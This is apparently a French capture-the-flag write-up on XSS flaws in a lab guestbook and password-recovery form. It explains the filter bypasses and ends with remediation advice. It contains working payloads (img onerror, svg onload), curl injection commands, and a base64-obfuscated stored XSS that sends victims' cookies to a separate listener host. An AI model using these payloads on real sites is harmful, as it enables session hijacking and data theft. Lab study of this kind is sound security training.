Le champ Message est probablement échappé côté serveur avec :
phphtmlspecialchars($comment)  // transforme < en &lt; > en &gt;
// ou
htmlentities($comment)

Car il ne semble pas injectable.
En revanche, le maxlength du champ Name n'est pas verifie cote backend.

<script>alert(1)</script>
Ne passe pas, "script" est strippe?

Essayons d'autres balises:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Ca fonctionne! Le script est REFLETE et execute sur la page.

Le code backend doit probablement ressembler a:
$name = str_replace("<script>", "", $input);
// ou
$name = preg_replace('/script/i', '', $input);

C'est un filtre blacklist naïf:
au lieu de valider ce qui est autorisé (whitelist), il essaie de bloquer ce qui est interdit,
ce qui est toujours contournable.

Cette faille permet d'executer du code sur la machine d'un autre client, ou de voler ses cookies de sessions.
Le champ comment échappe correctement les caractères spéciaux via htmlspecialchars(),
contrairement au champ name qui applique un filtre blacklist insuffisant.

Le payload suivant poste une XSS qui fetch un serveur distant, exfiltrant les cookies.
echo -n "var i=new Image();i.src='http://192.168.56.102:8888/?c='+document.cookie;" | base64 >payload.b64

dmFyIGk9bmV3IEltYWdlKCk7aS5zcmM9J2h0dHA6Ly8xOTIuMTY4LjU2LjEwMjo4ODg4Lz9jPScr
ZG9jdW1lbnQuY29va2llOw==

fetch("http://192.168.56.101/index.php?page=feedback", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: 'txtName=<img src=x onerror="eval(atob(\'dmFyIGk9bmV3IEltYWdlKCk7aS5zcmM9J2h0dHA6Ly8xOTIuMTY4LjU2LjEwMjo4ODg4Lz9jPScrZG9jdW1lbnQuY29va2llOw==\'))">&mtxtMessage=PROUT&btnSign=Sign Guestbook'
})

Le champ mail trigger le flag.
curl -s "http://192.168.56.101/index.php?page=recover" \
     -X POST \
     --data "mail=<script>alert(1)</script>&Submit=Submit" | grep -i "flag\|script\|mail"

XSS Stored - Recover Page
===========================

URL vulnérable : http://192.168.56.101/index.php?page=recover

Le champ "mail" du formulaire de récupération de mot de passe
n'est pas sanitisé côté serveur.

Un payload XSS injecté dans ce champ est exécuté par le serveur
et retourné dans la réponse HTML.

Exploitation :
  curl -s "http://192.168.56.101/index.php?page=recover" \
       -X POST \
       --data "mail=<img src=x onerror=alert(1)>&Submit=Submit"

Payloads qui fonctionnent :
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  (note: <script> est filtré)

Correction :
  - Échapper les caractères spéciaux avec htmlspecialchars()
  - Valider le format email côté serveur (regex)
  - Utiliser une whitelist de caractères autorisés

OWASP : A03 - Cross-Site Scripting (XSS)